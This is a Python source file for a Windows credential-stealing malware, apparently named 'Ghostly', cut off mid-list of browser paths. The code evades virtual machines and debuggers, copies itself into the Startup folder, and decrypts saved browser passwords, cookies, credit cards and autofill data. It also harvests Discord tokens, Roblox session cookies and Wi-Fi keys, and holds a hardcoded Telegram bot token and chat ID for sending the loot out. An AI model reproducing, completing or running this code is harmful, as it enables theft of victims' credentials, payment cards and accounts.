import os
import time
import sys
import subprocess
# import pyautogui
import mss
from mss import tools
import wmi
import threading
import requests
import base64
from sqlite3 import connect as sql_connect
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import shutil
import ctypes
import random
import psutil
import getpass
import json
import re
import telebot, urllib,winreg
import warnings
from base64 import b64decode
from io import BytesIO
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from sys import executable, stderr
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()
ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
]
for module in ModuleRequirements:
    try: 
        __import__(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)
ghostly = "7134012656:AAFPg1AXnCBiY4T0fJMcfPOEEAe7fPMruvU"
chat_id = "6479502705"
bot = telebot.TeleBot(ghostly)

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
username = os.getenv("USERNAME")
class NullWriter(object):
    def write(self, arg):
        pass

warnings.filterwarnings("ignore")
null_writer = NullWriter()
stderr = null_writer

def antidebug():
    checks = [check_windows, check_ip, check_registry, check_dll]
    for check in checks:
        t = threading.Thread(target=check, daemon=True)
        t.start()
def exit_program(reason):
    print(reason)
    ctypes.windll.kernel32.ExitProcess(0)
def check_dll():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        exit_program('VM Detected')
def check_windows():
    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
    def winEnumHandler(hwnd, ctx):
        title = ctypes.create_string_buffer(1024)
        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
        if title.value.decode('Windows-1252').lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'cse pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit', 'george', 'ABBY'}:
            pid = ctypes.c_ulong(0)
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value != 0:
                try:
                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
                    ctypes.windll.kernel32.CloseHandle(handle)
                except:
                    pass
            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
        return True

    while True:
        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
        time.sleep(0.5)
def check_ip():
    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228','35.185.226.17','104.198.155.173',None}    
    while True:
        try:
            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
            if ip in blacklisted:
                exit_program('Blacklisted IP Detected')
            return
        except:
            pass

def check_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
        subkey_count = winreg.QueryInfoKey(key)[0]
        for i in range(subkey_count):
            subkey = winreg.EnumKey(key, i)
            if subkey.startswith('VMWARE'):
                exit_program('VM Detected')
        winreg.CloseKey(key)
    except:
        pass


def getip():
    try:return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:return "None"

def globalInfo():
    try:
        Ip = getip()
        api_key = '21DA3C31774AD4821B0A69362DC07ACB'

        # URL API
        url = f'https://api.ip2location.io/?key={api_key}&ip={Ip}'

        # Gửi yêu cầu GET đến API
        response = requests.get(url)

        if response.status_code == 200:
            data = response.json()
            country_name = data.get('country_name')
            country_code = data.get('country_code')
            city_name = data.get('city_name')
            region_name= data.get('region_name')
            # print(data.get('latitude'))
            # print(data.get('longitude'))
            globalinfo = f"🌏IP: {Ip}\n🌏Country: {country_name}\n🌏Region: {region_name}\n🌏City: {city_name}\n🌏Country Code: {country_code}\n"
            return globalinfo
    except Exception as e:
        return f"🌏Cannot get victim's ip\n"
Ip = getip()
ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{Ip}")).read().decode().replace('callback(', '').replace('})', '}')
ipdata = json.loads(ipdatanojson)
contryCode = ipdata["country_code"]
def makedir():
    try:
        username = os.getenv("USERNAME")
        upload_folder = os.path.join(temp, f"{contryCode}_Ghostly_"+username)
        os.makedirs(upload_folder, exist_ok=True)
    except:
        pass
makedir()
if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]
def Getdata (blob_out ):#line:1
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw
def Creeper(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return Getdata(blob_out)

def Decreeper(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

CookiCount, PassCount,CreCount,AutofillCount,Hiscount = 0, 0, 0, 0, 0
def getpass(path, arg):
    try:
        global PassCount
        Pass = []
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return
    
        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = Creeper(master_key[5:])
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        data = cursor.fetchall()
        # orgin_name = path + arg
        # parts = orgin_name.split('/')
        # browser = parts[1]
        # default = parts[-1]
        for row in data: 
            if row[0] != '' and row[1] != '' and row[2] != '':
                Pass.append(f"Site: {row[0]}\nUser: {row[1]}\nPass: {Decreeper(row[2], master_key)}\n")
                PassCount += 1
        destination_folder = os.path.join(temp, f"{contryCode}_Ghostly_"+username, "Credentials")  # Thư mục đích
        os.makedirs(destination_folder, exist_ok=True)
        destination_file = os.path.join(destination_folder, f"Browser Passwords.txt")
        with open(destination_file,'w', encoding="utf-8") as f:
            for line in Pass:
                f.write(line+'\n')
        cursor.close()
        conn.close()
        os.remove(tempfold)
    except:pass  
Cookie = []
def getcookie(path, arg):
    try:
        global Cookie,CookiCount
        if not os.path.exists(path): return
        
        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return
        
        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        data = cursor.fetchall()
        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = Creeper(master_key[5:])
        destination_folder = os.path.join(temp, f"{contryCode}_Ghostly_"+username, "Credentials")  # Thư mục đích
        os.makedirs(destination_folder, exist_ok=True)
        destination_file = os.path.join(destination_folder, "Browser Cookies.txt")
        for row in data: 
            if row[0] != '':
                Cookie.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{Decreeper(row[2], master_key)}\n\n")
                CookiCount += 1
        with open(destination_file,'a') as f:
            for line in Cookie:
                f.write(line+"\n")
        cursor.close()
        conn.close()
        os.remove(tempfold)
    except:pass
def getcre(path, arg):
    try:
        global Cre, CreCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = Creeper(master_key[5:])
        destination_folder = os.path.join(temp, f"{contryCode}_Ghostly_"+username, "Credentials")  # Thư mục đích
        os.makedirs(destination_folder, exist_ok=True)
        destination_file = os.path.join(destination_folder, "Credit Cards.txt")
        with open(destination_file,'a') as f:
            cursor.execute("SELECT * FROM credit_cards ")
            data = cursor.fetchall()
            for row in data:
                if row[0] != '':
                    f.write(f"Card Name: {row[1]} | Numbers: {Decreeper(row[4], master_key)} | Expiry: {row[2]}/{row[3]}\n\n")
                    CreCount += 1
        cursor.close()
        conn.close()
        os.remove(tempfold)
    except:pass
def getatfil(path, arg):
    try:
        global Autofill, AutofillCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        destination_folder = os.path.join(temp, f"{contryCode}_Ghostly_"+username, "Credentials")  # Thư mục đích
        os.makedirs(destination_folder, exist_ok=True)
        destination_file = os.path.join(destination_folder, "AutoFills.txt")
        with open(destination_file,'a') as f:
            cursor.execute("SELECT * FROM autofill WHERE value NOT NULL")
            data = cursor.fetchall()
            for row in data:
                if row[0] != '':
                    f.write(f"Name: {row[0]} | Value: {row[1]}\n\n")
                    AutofillCount += 1
        cursor.close()
        conn.close()
        os.remove(tempfold)
    except:pass
def gethis(path, arg):
    try:
        global History, Hiscount
        if not os.path.exists(path): return

        pathC = path + arg + "History"
        if os.stat(pathC).st_size == 0: return
        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        destination_folder = os.path.join(temp, f"{contryCode}_Ghostly_"+username, "Credentials")  # Thư mục đích
        os.makedirs(destination_folder, exist_ok=True)
        destination_file = os.path.join(destination_folder, "Histories.txt")
        with open(destination_file,'a') as f:
            cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls')
            data = cursor.fetchall()
            for row in data:
                if not row[0] or not row[1] or not row[2]:
                    f.write(f"Url: {row[0]}\nTitle: {row[1]}\nVisited: {row[2]}\nLast Visited: {row[3]}\n\n")
                    Hiscount += 1
        cursor.close()
        conn.close()
        os.remove(tempfold)
    except:pass
def StealSystemInfo():
    process = subprocess.run("systeminfo", capture_output=True, shell=True)
    output1 = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n")
    if output1:
        lines = output1.split('\n')
        system_info = {}
        for line in lines:
            parts = line.split(':')
            if len(parts) == 2:
                key = parts[0].strip()
                value = parts[1].strip()
                system_info[key] = value
        data = '\n'.join([f"{key}: {value}" for key, value in system_info.items()])
        destination_folder = os.path.join(temp, f"{contryCode}_Ghostly_"+username, "System") 
        os.makedirs(destination_folder, exist_ok=True) # Thư mục đích
        destination_file = os.path.join(destination_folder, "System Info.txt")
        with open(destination_file,'a') as f:
            f.write(data)
def gettoken():
    tokens = []
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        "Discord": roaming + "\\Discord",
        "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb",
        "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Opera": roaming + "\\Opera Software\\Opera Stable",
        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
        "Lightcord": roaming + "\\Lightcord",
        "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
        "Amigo": local + "\\Amigo\\User Data",
        "Torch": local + "\\Torch\\User Data",
        "Kometa": local + "\\Kometa\\User Data",
        "Orbitum": local + "\\Orbitum\\User Data",
        "CentBrowser": local + "\\CentBrowser\\User Data",
        "Sputnik": local + "\\Sputnik\\Sputnik\\User Data",
        "Chrome SxS": local + "\\Google\\Chrome SxS\\User Data",
        "Epic Privacy Browser": local + "\\Epic Privacy Browser\\User Data",
        "Microsoft Edge": local + "\\Microsoft\\Edge\\User Data\\Default",
        "Uran": local + "\\uCozMedia\\Uran\\User Data\\Default",
        "Iridium": local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
        "Firefox": roaming + "\\Mozilla\\Firefox\\Profiles",
        "CocCoc": local + "\\CocCoc\\Browser\\User Data\\Default",
    }
    username = os.getenv("USERNAME")
    temp = os.getenv("TEMP")
    destination_folder = os.path.join(temp, f"{contryCode}_Ghostly_"+username, "Discord")
    os.makedirs(destination_folder, exist_ok=True)
    destination_file = os.path.join(destination_folder, "Token.txt")

    for platform, path in paths.items():
        path = os.path.join(path, "local Storage", "leveldb")
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                    with open(os.path.join(path, file_name), errors="ignore") as file:
                        for line in file.readlines():
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                for token in re.findall(regex, line):
                                    token_entry = f"{token} | {platform}"
                                    if token_entry not in tokens:
                                        tokens.append(token_entry)

    with open(destination_file, "w") as f:
        for token in tokens:
            f.write(token + "\n")

def StealRobloxCookies(): # Steals Roblox cookies
    Separator = "\n"  # Set Separator to a newline character
    global Cookie
    note = "# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not."
    cookies = []
    browserCookies = "\n".join(Cookie)
    
    # Find cookies in the browser cookies
    for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", browserCookies):
        cookies.append(match)

    # Find cookies in the registry
    output = list()
    for item in ('HKCU', 'HKLM'):
        process = subprocess.run("powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY".format(item), capture_output=True, shell=True)
        if not process.returncode:
            output.append(process.stdout.decode(errors="ignore"))

    for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", "\n".join(output)):
        cookies.append(match)

    cookies = [*set(cookies)] # Removes duplicates
    if cookies:
        destination_folder = os.path.join(temp, f"{contryCode}_Ghostly_"+username, "Roblox")
        os.makedirs(destination_folder, exist_ok=True)
        destination_file = os.path.join(destination_folder, "Roblox Cookies.txt")
        with open(destination_file, "w") as file:
            file.write("{}{}{}".format(note, Separator, Separator.join(cookies)))     
def GetWifiPasswords(): # Gets wifi passwords stored in the system
    profiles = list()
    passwords = dict()
    Separator = "\n"
    for line in subprocess.run('netsh wlan show profile', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
        if 'All User Profile' in line:
            name= line[(line.find(':') + 1):].strip()
            profiles.append(name)
    
    for profile in profiles:
        found = False
        for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
            if 'Key Content' in line:
                passwords[profile] = line[(line.find(':') + 1):].strip()
                found = True
                break
        if not found:
            passwords[profile] = '(None)'
    for profile, psw in passwords.items():
        profiles.append(f"Network: {profile}\nPassword: {psw}")
    if profiles:
        destination_folder = os.path.join(temp, f"{contryCode}_Ghostly_"+username, "System")
        os.makedirs(destination_folder, exist_ok=True)
        destination_file = os.path.join(destination_folder, "Wifi Passwords.txt")
        with open(destination_file, "w", encoding= "utf-8", errors= "ignore") as file:
            file.write(Separator.lstrip() + Separator.join(profiles))                             
def kill_browser_processes(process_name):
    for process in psutil.process_iter():
        try:
            if process.name() == process_name:
                process.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
Threadlist = []

def process_browser_paths(paths):
    browser_processes = ["opera.exe", "chrome.exe", "brave.exe", "vivaldi.exe", "yandex.exe", "msedge.exe", "browser.exe"]
    for path_info in paths:
        process_name = path_info[1]
        if process_name in browser_processes:
            kill_browser_processes(process_name)

    for patt in paths: 
        pass_thread = threading.Thread(target=getpass, args=[patt[0], patt[3]])
        atfil_thread = threading.Thread(target=getatfil, args=[patt[0], patt[3]])
        cre_thread = threading.Thread(target=getcre, args=[patt[0], patt[3]])
        his_thread = threading.Thread(target=gethis, args=[patt[0], patt[3]])

        his_thread.start()
        pass_thread.start()
        atfil_thread.start()
        cre_thread.start()

        Threadlist.extend([his_thread, pass_thread, atfil_thread, cre_thread])

def process_cookies(paths):
    ThCokk = []
    for patt in paths: 
        a = threading.Thread(target=getcookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    for thread in ThCokk: 
        thread.join()

def gather_system_info():
    System = []
    b = threading.Thread(target=StealSystemInfo)
    c = threading.Thread(target=gettoken)
    d = threading.Thread(target=StealRobloxCookies)
    e = threading.Thread(target=GetWifiPasswords)
    b.start()
    c.start()
    d.start()
    e.start()
    System.extend([b, c, d, e])

    for thread in System: 
        thread.join()
def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                     Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [    
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 1/Local Storage/leveldb", "/Profile 1/",   "/Profile 1/Network",   "/Profile 1/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 2/Local Storage/leveldb", "/Profile 2/",   "/Profile 2/Network",   "/Profile 2/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 3/Local Storage/leveldb", "/Profile 3/",   "/Profile 3/Network",   "/Profile 3/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 4/Local Storage/leveldb", "/Profile 4/",   "/Profile 4/Network",   "/Profile 4/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 5/Local Storage/leveldb", "/Profile 5/",   "/Profile 5/Network",   "/Profile 5/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 6/Local Storage/leveldb", "/Profile 6/",   "/Profile 6/Network",   "/Profile 6/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 7/Local Storage/leveldb", "/Profile 7/",   "/Profile 7/Network",   "/Profile 7/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 8/Local Storage/leveldb", "/Profile 8/",   "/Profile 8/Network",   "/Profile 8/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 9/Local Storage/leveldb", "/Profile 9/",   "/Profile 9/Network",   "/Profile 9/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 10/Local Storage/leveldb","/Profile 10/",  "/Profile 10/Network",  "/Profile 10/Local Extension Settings/"           ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 11/Local Storage/leveldb", "/Profile 11/",   "/Profile 11/Network",   "/Profile 11/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 12/Local Storage/leveldb", "/Profile 12/",   "/Profile 12/Network",   "/Profile 12/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 13/Local Storage/leveldb", "/Profile 13/",   "/Profile 13/Network",   "/Profile 13/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 14/Local Storage/leveldb", "/Profile 14/",   "/Profile 14/Network",   "/Profile 14/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 15/Local Storage/leveldb", "/Profile 15/",   "/Profile 15/Network",   "/Profile 15/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 16/Local Storage/leveldb", "/Profile 16/",   "/Profile 16/Network",   "/Profile 16/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 17/Local Storage/leveldb", "/Profile 17/",   "/Profile 17/Network",   "/Profile 17/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 18/Local Storage/leveldb", "/Profile 18/",   "/Profile 18/Network",   "/Profile 18/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 19/Local Storage/leveldb", "/Profile 19/",   "/Profile 19/Network",   "/Profile 19/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 20/Local Storage/leveldb","/Profile 20/",  "/Profile 20/Network",  "/Profile 20/Local Extension Settings/"           ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "msedge.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 1/Local Storage/leveldb",   "/Profile 1/", "/Profile 1/Network",     "/Profile 1/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 2/Local Storage/leveldb",   "/Profile 2/", "/Profile 2/Network",     "/Profile 2/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 3/Local Storage/leveldb",   "/Profile 3/", "/Profile 3/Network",     "/Profile 3/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 4/Local Storage/leveldb",   "/Profile 4/", "/Profile 4/Network",     "/Profile 4/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 5/Local Storage/leveldb",   "/Profile 5/", "/Profile 5/Network",     "/Profile 5/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 6/Local Storage/leveldb",   "/Profile 6/", "/Profile 6/Network",     "/Profile 6/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 7/Local Storage/leveldb",   "/Profile 7/", "/Profile 7/Network",     "/Profile 7/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 8/Local Storage/leveldb",   "/Profile 8/", "/Profile 8/Network",     "/Profile 8/Local Extension Settings/"          ],
